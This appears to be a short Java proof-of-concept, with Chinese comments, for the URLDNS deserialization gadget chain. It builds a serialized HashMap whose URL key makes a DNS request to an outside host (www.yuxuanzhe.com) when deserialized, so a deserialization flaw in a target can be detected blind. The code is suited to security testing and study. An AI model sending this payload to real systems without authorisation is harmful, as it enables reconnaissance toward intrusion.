
import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
/*不限制jdk版本，使用Java内置类，对第三方依赖没有要求
  目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
  URLDNS利用链，只能发起DNS请求，并不能进行其他利用*/
public class Main {
    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL("http://www.yuxuanzhe.com:82/hhh");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true); // 绕过Java语言权限控制检查的权限
        f.set(url,1); // 设置hashcode的值不为-1
        System.out.println(url.hashCode());
        map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询
        f.set(url,-1); // 将hashcode重新设置为-1，确保在反序列化成功触发

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);

            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
            inputStream.readObject();
            inputStream.close();
            fileInputStream.close();
        }
        catch (Exception e){
            e.printStackTrace();
        }

    }

}